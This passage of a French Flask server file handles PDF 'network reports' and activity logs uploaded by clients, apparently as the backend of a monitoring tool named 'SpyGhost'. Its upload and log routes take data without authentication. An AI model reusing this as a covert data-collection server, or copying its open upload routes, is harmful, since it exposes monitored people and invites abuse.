            pdf_paths.append(data_pdf_path)
            app.logger.info(f"PDF trouvé dans le répertoire principal: {data_pdf_path}")
        
        # 3. Vérifier aussi dans la base de données
        try:
            conn = get_db_connection()
            client = conn.execute('SELECT pdf_report_path FROM clients WHERE id = ?', (client_id,)).fetchone()
            
            if client and client['pdf_report_path'] and os.path.exists(client['pdf_report_path']):
                pdf_paths.append(client['pdf_report_path'])
                app.logger.info(f"PDF trouvé via la base de données: {client['pdf_report_path']}")
            conn.close()
        except Exception as db_err:
            app.logger.warning(f"Erreur lors de la vérification du chemin du PDF dans la base de données: {str(db_err)}")
        
        # Si aucun PDF n'a été trouvé
        if not pdf_paths:
            app.logger.warning(f"Rapport PDF non disponible pour le client {client_id} - aucun fichier trouvé")
            return jsonify({
                'message': 'Rapport PDF non disponible - aucun fichier trouvé',
                'search_locations': [
                    pdf_path,
                    data_pdf_path,
                    client['pdf_report_path'] if client and client['pdf_report_path'] else "N/A"
                ]
            }), 404
        
        # Utiliser le premier PDF trouvé
        pdf_path = pdf_paths[0]
        app.logger.info(f"Utilisation du PDF: {pdf_path} (taille: {os.path.getsize(pdf_path)} octets)")
        
        # Si c'est une requête HEAD, on retourne juste un statut 200 pour indiquer que le fichier existe
        if request.method == 'HEAD':
            return '', 200, {'Content-Type': 'application/pdf'}
        
        # Envoyer le fichier au navigateur pour téléchargement
        directory = os.path.dirname(pdf_path)
        filename = os.path.basename(pdf_path)
        
        # Nom de fichier pour le téléchargement
        download_name = f"client_{client_id}_rapport_reseau.pdf"
        
        try:
            app.logger.info(f"Envoi du fichier depuis le répertoire: {directory}, nom du fichier: {filename}")
            response = send_from_directory(
                directory,
                filename,
                as_attachment=True,
                mimetype='application/pdf'
            )
            
            # Définir explicitement l'en-tête Content-Disposition pour forcer le téléchargement
            response.headers["Content-Disposition"] = f"attachment; filename={download_name}"
            
            # Désactiver la mise en cache pour éviter les problèmes avec les anciens PDFs
            response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
            response.headers["Pragma"] = "no-cache"
            response.headers["Expires"] = "0"
            
            app.logger.info(f"PDF téléchargé avec succès pour le client {client_id} depuis {pdf_path}")
            return response
        except Exception as e:
            app.logger.error(f"Erreur lors de l'envoi du fichier PDF: {str(e)}")
            return jsonify({'message': f'Erreur lors du téléchargement du PDF: {str(e)}'}), 500
    except Exception as e:
        app.logger.error(f"Erreur lors du traitement de la demande de téléchargement PDF: {str(e)}")
        return jsonify({'message': f'Erreur serveur: {str(e)}'}), 500

# Ajouter une route pour recevoir le PDF du client
@app.route('/client/<int:client_id>/upload_pdf', methods=['POST'])
def receive_pdf(client_id):
    """Reçoit le fichier PDF généré par le client."""
    try:
        # Vérifier si nous avons reçu un fichier
        if 'pdf_file' not in request.files:
            app.logger.error(f"Pas de fichier PDF reçu pour le client {client_id}")
            return jsonify({'message': 'Pas de fichier PDF reçu', 'success': False}), 400

        pdf_file = request.files['pdf_file']
        
        if not pdf_file.filename:
            app.logger.error(f"Nom de fichier PDF vide pour le client {client_id}")
            return jsonify({'message': 'Nom de fichier PDF vide', 'success': False}), 400
        
        # Obtenir le chemin absolu du répertoire de l'application (où se trouve server.exe)
        app_dir = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
        app.logger.info(f"Répertoire d'application: {app_dir}")
        
        # Créer le dossier pdf_reports dans le même répertoire que l'exécutable
        pdf_dir = os.path.join(app_dir, 'pdf_reports')
        if not os.path.exists(pdf_dir):
            os.makedirs(pdf_dir)
            app.logger.info(f"Dossier pdf_reports créé: {pdf_dir}")
            
        # Construire le chemin du fichier
        filename = f"client_{client_id}_network_report.pdf"
        filepath = os.path.join(pdf_dir, filename)
        
        # Enregistrer le fichier avec gestion d'erreur
        try:
            app.logger.info(f"Tentative d'enregistrement du PDF du client {client_id} dans {filepath}")
            pdf_file.save(filepath)
            
            # Vérifier que le fichier a bien été enregistré
            if not os.path.exists(filepath):
                app.logger.error(f"Échec de l'enregistrement du PDF: fichier inexistant pour le client {client_id}")
                return jsonify({'message': 'Fichier introuvable après sauvegarde', 'success': False}), 500
                
            if os.path.getsize(filepath) == 0:
                app.logger.error(f"Échec de l'enregistrement du PDF: fichier vide pour le client {client_id}")
                return jsonify({'message': 'Fichier vide après sauvegarde', 'success': False}), 500
                
            app.logger.info(f"PDF du client {client_id} enregistré avec succès: {filepath} (taille: {os.path.getsize(filepath)} octets)")
        except Exception as save_error:
            app.logger.error(f"Exception lors de l'enregistrement du PDF: {str(save_error)}")
            return jsonify({'message': f'Erreur lors de l\'enregistrement du PDF: {str(save_error)}', 'success': False}), 500
        
        # Mettre à jour le chemin dans la base de données
        try:
            conn = get_db_connection()
            conn.execute('UPDATE clients SET pdf_report_path = ? WHERE id = ?', (filepath, client_id))
            conn.commit()
            conn.close()
            app.logger.info(f"Base de données mise à jour avec le chemin du PDF: {filepath}")
        except Exception as db_error:
            app.logger.error(f"Erreur lors de la mise à jour de la base de données: {str(db_error)}")
            # Continuer malgré l'erreur de base de données, le fichier est sauvegardé
        
        # Répondre au client
        return jsonify({'message': 'PDF reçu et enregistré avec succès', 'success': True}), 200
    except Exception as e:
        app.logger.error(f"Exception générale lors du traitement du PDF: {str(e)}")
        return jsonify({'message': f'Erreur serveur: {str(e)}', 'success': False}), 500

# Route pour recevoir et récupérer les logs d'activité
@app.route('/client/<int:client_id>/logs', methods=['POST'])
def receive_logs(client_id):
    """Reçoit les logs d'activité d'un client."""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'message': 'Données invalides'}), 400
        
        # Assurer que la colonne existe
        ensure_activity_logs_column()
        
        conn = get_db_connection()
        conn.execute('UPDATE clients SET activity_logs = ? WHERE id = ?', 
                    (json.dumps(data), client_id))
        conn.commit()
        conn.close()
        
        return jsonify({'message': 'Logs d\'activité enregistrés'}), 200
    except Exception as e:
        app.logger.error(f"Erreur lors de la réception des logs d'activité: {str(e)}")
        return jsonify({'message': f'Erreur lors de la réception des logs: {str(e)}'}), 500

@app.route('/client/<int:client_id>/logs', methods=['GET'])
@auth_required
def get_logs(client_id):
    """Récupère les logs d'activité d'un client."""
    try:
        # Assurer que la colonne existe
        ensure_activity_logs_column()
        
        conn = get_db_connection()
        client = conn.execute('SELECT activity_logs FROM clients WHERE id = ?', (client_id,)).fetchone()
        conn.close()
        
        if client and client['activity_logs']:
            return jsonify({'logs': json.loads(client['activity_logs'])}), 200
        else:
            return jsonify({'logs': []}), 200
    except Exception as e:
        app.logger.error(f"Erreur lors de la récupération des logs d'activité: {str(e)}")
        return jsonify({'logs': [], 'error': str(e)}), 200  # Retourner 200 même en cas d'erreur pour éviter les problèmes côté client

# Ajouter une route pour vérifier si un PDF existe (sans le télécharger)
@app.route('/client/<int:client_id>/check_pdf_exists', methods=['GET'])
@auth_required
def check_pdf_exists(client_id):
    """Vérifie si un rapport PDF existe pour ce client."""
    try:
        # Vérifier d'abord le chemin dans la base de données
        conn = get_db_connection()
        client = conn.execute('SELECT pdf_report_path FROM clients WHERE id = ?', (client_id,)).fetchone()
        conn.close()
        
        # Vérifier le chemin dans la base de données
        if client and client['pdf_report_path'] and os.path.exists(client['pdf_report_path']):
            return jsonify({'exists': True, 'path': client['pdf_report_path']}), 200
        
        # Vérifier le fichier data.pdf dans le répertoire principal
        parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        data_pdf_path = os.path.join(parent_dir, 'data.pdf')
        network_report_path = os.path.join(parent_dir, 'network_report.pdf')
        
        if os.path.exists(data_pdf_path):
            # Mettre à jour le chemin dans la base de données
            try:
                conn = get_db_connection()
                conn.execute('UPDATE clients SET pdf_report_path = ? WHERE id = ?', (data_pdf_path, client_id))
                conn.commit()
                conn.close()
                app.logger.info(f"Chemin du PDF mis à jour pour le client {client_id}: {data_pdf_path}")
            except Exception as db_err:
                app.logger.warning(f"Impossible de mettre à jour le chemin du PDF: {str(db_err)}")
                
            return jsonify({'exists': True, 'path': data_pdf_path}), 200
            
        if os.path.exists(network_report_path):
            return jsonify({'exists': True, 'path': network_report_path}), 200
        
        # Aucun PDF trouvé
        return jsonify({'exists': False}), 200
        
    except Exception as e:
        app.logger.error(f"Erreur lors de la vérification de l'existence du PDF: {str(e)}")
        return jsonify({'exists': False, 'error': str(e)}), 500

# Ajouter cette route pour gérer les requêtes favicon.ico
@app.route('/favicon.ico')
def favicon():
    return send_from_directory(app.static_folder, 'SpyGhost_icon.ico', mimetype='image/x-icon')

if __name__ == '__main__':
    # Toujours vérifier si le fichier de base de données existe et est valide
    db_exists = os.path.exists(DATABASE)
    
    if not db_exists:
        print("Base de données non trouvée, création en cours...")
        init_db()
        print('Base de données initialisée au démarrage.')
    else:
        # Vérifier si la table clients existe
        try:
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='clients';")
            if not cursor.fetchone():
                print("Structure de la base de données incorrecte, réinitialisation...")
                conn.close()
                init_db()
            else:
                print("Base de données existante et valide.")
            conn.close()
        except Exception as e:
            print(f"Erreur lors de la vérification de la base de données: {e}")
            print("Réinitialisation de la base de données...")
            init_db()
    
    # S'assurer que les colonnes existent seulement après l'initialisation
    try:
        ensure_activity_logs_column()
        ensure_pdf_report_path_column()
    except Exception as e:
        print(f"Erreur lors de la vérification des colonnes: {e}")
    
    # Démarrer le vérificateur de déconnexions seulement après l'initialisation de la base de données
    demarrer_verificateur_deconnexions()
    
    # Lancement du serveur
    app.run(host='0.0.0.0')  # Écoute sur toutes les interfaces réseau